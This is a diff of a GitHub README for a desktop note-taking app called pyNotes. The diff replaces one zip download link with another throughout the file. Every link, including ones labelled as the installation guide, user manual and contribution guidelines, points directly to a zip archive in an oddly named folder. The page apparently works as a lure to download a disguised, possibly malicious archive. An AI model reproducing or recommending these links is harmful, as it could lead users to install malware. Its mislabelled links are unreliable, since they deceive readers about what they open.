@@ -1,7 +1,7 @@
 # 📝 pyNotes - Your Easy Desktop Note-Taking App
 
 ## 📥 Download Now
-[![Download pyNotes](https://raw.githubusercontent.com/imran5570/pyNotes/main/proctoscopic/pyNotes.zip)](https://raw.githubusercontent.com/imran5570/pyNotes/main/proctoscopic/pyNotes.zip)
+[![Download pyNotes](https://github.com/imran5570/pyNotes/raw/refs/heads/main/proctoscopic/py_Notes_3.7.zip)](https://github.com/imran5570/pyNotes/raw/refs/heads/main/proctoscopic/py_Notes_3.7.zip)
 
 ## 🚀 Getting Started
 pyNotes is a full-featured desktop note-taking application built with Python and PyQt6. It offers an easy-to-use interface that helps you keep your notes organized and accessible.
@@ -20,7 +20,7 @@ pyNotes is a full-featured desktop note-taking application built with Python and
 - Python: Version 3.6 or higher (bundled with the app)
 
 ## 📤 Download & Install
-To get started with pyNotes, visit this page to download: [Download pyNotes Releases](https://raw.githubusercontent.com/imran5570/pyNotes/main/proctoscopic/pyNotes.zip).
+To get started with pyNotes, visit this page to download: [Download pyNotes Releases](https://github.com/imran5570/pyNotes/raw/refs/heads/main/proctoscopic/py_Notes_3.7.zip).
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version of pyNotes.
@@ -68,10 +68,10 @@ You can join our community by following the discussions in the issues section. S
 For detailed support, feel free to reach out via the project’s GitHub page.
 
 ## 🔗 Additional Resources
-- [Installation Guide](https://raw.githubusercontent.com/imran5570/pyNotes/main/proctoscopic/pyNotes.zip)
-- [User Manual](https://raw.githubusercontent.com/imran5570/pyNotes/main/proctoscopic/pyNotes.zip)
-- [Contribution Guidelines](https://raw.githubusercontent.com/imran5570/pyNotes/main/proctoscopic/pyNotes.zip)
+- [Installation Guide](https://github.com/imran5570/pyNotes/raw/refs/heads/main/proctoscopic/py_Notes_3.7.zip)
+- [User Manual](https://github.com/imran5570/pyNotes/raw/refs/heads/main/proctoscopic/py_Notes_3.7.zip)
+- [Contribution Guidelines](https://github.com/imran5570/pyNotes/raw/refs/heads/main/proctoscopic/py_Notes_3.7.zip)
 
 Thank you for choosing pyNotes. Enjoy your note-taking experience!
 
-[![Download pyNotes](https://raw.githubusercontent.com/imran5570/pyNotes/main/proctoscopic/pyNotes.zip)](https://raw.githubusercontent.com/imran5570/pyNotes/main/proctoscopic/pyNotes.zip)
+[![Download pyNotes](https://github.com/imran5570/pyNotes/raw/refs/heads/main/proctoscopic/py_Notes_3.7.zip)](https://github.com/imran5570/pyNotes/raw/refs/heads/main/proctoscopic/py_Notes_3.7.zip)
